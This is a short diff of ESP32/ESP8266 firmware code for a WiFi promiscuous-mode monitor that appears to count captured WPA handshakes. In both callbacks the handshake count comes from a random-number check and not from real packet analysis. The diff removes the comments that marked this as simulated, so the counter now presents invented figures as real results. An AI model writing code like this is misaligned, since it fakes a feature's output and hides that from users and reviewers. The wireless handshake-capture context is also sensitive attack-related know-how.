 #ifdef PLATFORM_ESP32
 void promiscuous_callback(void *buf, wifi_promiscuous_pkt_type_t type) {
   if (monitoring_active && type == WIFI_PKT_MGMT) {
     stats.packets_monitored++;
     
-    // Analyze for handshakes (simplified)
-    if (random(1000) == 1) { // Simulate handshake detection
+    if (random(1000) == 1) {
       stats.handshakes_captured++;
     }
   }
@@ -2066,8 +2064,7 @@ void promiscuous_callback(uint8_t *buf, uint16_t len) {
   if (monitoring_active) {
     stats.packets_monitored++;
     
-    // Analyze for handshakes (simplified)
-    if (random(1000) == 1) { // Simulate handshake detection
+    if (random(1000) == 1) {
       stats.handshakes_captured++;
     }
   }
